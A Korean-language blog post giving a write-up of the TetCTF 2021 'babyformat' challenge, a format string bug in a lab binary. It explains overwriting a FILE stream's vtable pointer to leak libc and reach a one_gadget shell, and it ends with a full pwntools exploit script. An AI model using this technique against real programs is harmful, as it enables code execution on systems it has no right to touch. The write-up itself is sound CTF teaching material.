---
layout: post
title: TetCTF 2021 babyformat writeup
categories: ctf-write-up
tags: [ctf]
---


## babyformat

삽질을 굉장히 많이한 문제이다. 



취약점은 여기서 발생한다.

```c
int __fastcall sub_40091C(FILE *a1, const char *a2)
{
  printf("Your data: %s\n", a2);
  return fprintf(a1, a2);
}
```

하지만 `fprintf`를 이용하기 때문에 output을 볼 수 없다. 

근데 위의 printf 문을 보면 a2를 %s로 출력을 해주는데 저 주소는 bss 영역이라서 leak을 할 수 없다.



```c
int __fastcall sub_4009CB(__int64 a1)
{
  FILE *stream; // [rsp+18h] [rbp-28h]

  printf("Data you wan't to log into /dev/null: ");
  stream = fopen("/dev/null", "w+");
  if ( !stream )
  {
    puts("Error~");
    exit(0);
  }
  readline(a1, 512);
  fsb((__int64)stream, a1);
  return fclose(stream);
}
```

위 코드를 보면 fsb가 발생한 이후 `fclose`를 호출한다. 그리고 이때 stream은 스택 내에 저장되어 있다.

따라서 스택을 가리키는 포인터를 이용하여 stream이 저장되어 있는 스택을 가리키게 하고

이 stream을 가리키는 스택에 접근하여 stream 내의 vtable을 가리키게 하고 stream의 vtable에 접근하여

원하는 주소에 접근 하도록 할 수 있다. (트리플 스테이지..?)

롸업쓰면서 다시 생각해보니 더 쉽게 풀 수 있는 방법도 있는거 같은데 일단 푼 대로 써야겠다..



pie가 안걸려있고 input은 bss 영역에 들어가니 `fake vtable`도 원하는대로 만들 수 있다.

이제 어떤 주소로 이동할 지 결정을 해야한다.  나는 **0x4009cb** 주소로 이동했다.



fprintf를 호출하기 이전에, printf로 a2를 출력해주는 루틴이 존재하는데,

0x4009cb부터 실행하면 a2는 bss 영역이 아니게 되어서  leak이 가능한 구조가 된다.



이제 다시 main 함수로 흐름을 변경하면 bss에 입력을 받을 것이고, bss에 fake vtable을 만들고 one_gadget을 실행할 수 있다.

이 과정 이전에 ret를 one_gadget으로 변경하는 코드를 짰으나 모든 one_gadget이 되지 않아서 절망햇엇다,,





요약 (Summary)

1. Using fsb, modify the vtable (rip should be **0x4009cb**)
   - (1) Create a pointer to point to the stack address where the stream is stored.
   - (2) Modify the 1 byte of the stream address to point to vtable.
2.  Using fsb, modify the return address of the stack to **main**
3.  Using fsb, modify the stream address to `fake_vtable`



```python
from pwn import *

e = ELF('./babyformat')
libc = e.libc

while True:
    p = process('./babyformat', env={'LD_PRELOAD':'./libc-2.23.so'})
    #p = remote("192.46.228.70", 31337)

    payload = ''
    payload += '%c' * 24
    payload += '%{}c'.format(0x28 - 24)
    payload += '%hhn'
    payload += '%c' * 1
    payload += '%{}c'.format(0xe8 - 0x29)
    payload += '%hhn'
    payload += '%{}c'.format(0x6020a0 - 0xe8)
    payload += '%24$ln'
    payload += 'A' * (0x78 - len(payload))
    payload += p64(0x4009CB)
    p.sendlineafter(': ', payload)

    payload = ''
    payload += '%c' * 9
    payload += '%{}c'.format(0x48 - 9)
    payload += '%hhn'
    payload += '%{}c'.format(0xcb - 0x48)
    payload += '%19$hhn'
    payload += 'A' * (0x68 - len(payload))

    try:
        p.sendlineafter("Data you wan't to log into /dev/null: ", payload)
    except:
        p.close()
        continue
    
    leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    libc_base = leak - 0x3c5540
    one_gadget = libc_base + 0xf0364

    payload = ''
    payload += '%c' * 9
    payload += '%{}c'.format(0x100 - 9)
    payload += '%hhn'
    payload += '%c' * 6
    payload += '%{}c'.format(0x400af4 - 0x106)
    payload += '%n'
    p.sendlineafter("Data you wan't to log into /dev/null: ", payload)

    payload = ''
    payload += '%{}c'.format(0x602070)
    payload += '%21$n'
    payload += 'A' * (8 - len(payload) % 8)
    payload += p64(0) * 17
    payload += p64(0x602070)
    payload += p64(0) * 9
    payload += p64(0x602170)
    payload += p64(0) * 6
    payload += p64(one_gadget)
    p.sendlineafter("Data you wan't to log into /dev/null: ", payload)
    break

p.interactive()
```